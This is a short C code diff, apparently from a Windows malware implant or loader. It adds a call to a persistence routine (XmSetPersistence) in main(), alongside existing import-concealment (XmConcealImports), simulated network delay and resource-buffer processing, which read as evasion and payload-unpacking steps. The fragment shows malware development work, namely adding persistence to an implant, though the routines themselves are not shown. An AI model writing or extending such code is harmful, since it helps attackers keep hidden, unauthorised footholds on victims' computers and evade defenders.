@@ -44,13 +44,25 @@ VOID XmSimulateNetworkDelay(IN FLOAT delayMinutes) {
 }
 
 int main() {
+#ifdef DEBUG
+    CreateDebugConsole();
+#endif
+
+    // Only keep persistence
+#ifdef DEBUG
+    PRINT("\n[*] Attempting to set persistence...\n");
+#endif
+
+    if (!XmSetPersistence()) {
+#ifdef DEBUG
+        PRINT("[!] Failed to set persistence - continuing anyway\n");
+#endif
+    }
+
+    // Original network initialization
     PBYTE   resourceBuffer     = NULL,
             processedBuffer    = NULL;
     DWORD   resourceSize       = 0x00;
-
-#ifdef DEBUG
-    CreateDebugConsole();
-#endif // DEBUG
 
     // Initialize network components
     XmConcealImports();
